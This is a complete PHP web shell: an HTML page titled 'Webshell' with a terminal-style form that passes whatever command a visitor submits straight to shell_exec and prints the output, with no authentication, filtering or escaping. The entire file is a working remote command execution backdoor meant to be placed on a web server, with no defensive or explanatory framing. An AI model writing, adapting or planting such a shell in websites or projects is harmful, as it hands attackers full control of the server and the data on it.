<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webshell</title>
    <style>
        body {
            background-color: black;
            color: white;
            display: flex;
            flex-direction: column;
            height: 100vh;
            margin: 0;
         }
         #terminal {
            flex-grow: 1;
            padding: 30px;
         }
         #input-container {
            padding: 30px;
            display: flex;
            justify-content: center;
         }

         #input {
            background-color: rgba(255, 255, 255, 0.1);
            color: white;
            border: none;
            padding: 10px;
            width: 100%;
         }
    </style>
</head>
<body>
    <div id="terminal">
        <?php
        if (isset($_POST['cmd'])) {
            $cmd = $_POST['cmd'];
            $output = shell_exec($cmd);
            $formatted_output = "<pre>$ {$cmd}:\n\n$output\n</pre>";
            echo $formatted_output;
        }
        ?>
    </div>
    <div id="input-container">
        <form method="post" action="">
            <input id="input" type="text" name="cmd" autofocus autocomplete="on" placeholder="Enter command..">
        </form>
    </div>
    
</body>
</html>
